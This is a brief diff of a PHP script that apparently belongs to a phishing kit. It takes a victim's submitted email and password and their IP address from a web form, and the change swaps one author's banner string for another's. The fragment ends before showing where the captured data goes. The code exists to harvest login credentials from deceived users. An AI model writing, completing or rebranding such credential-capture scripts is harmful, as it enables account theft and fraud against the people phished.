@@ -1,5 +1,5 @@
 <?php
-$file = "======[YUDA]======";
+$file = "yok======[riki]======bisa";
 $saya = $_POST['email'];
 $masuk = $_POST['password'];
 $semua = $_SERVER['REMOTE_ADDR'];
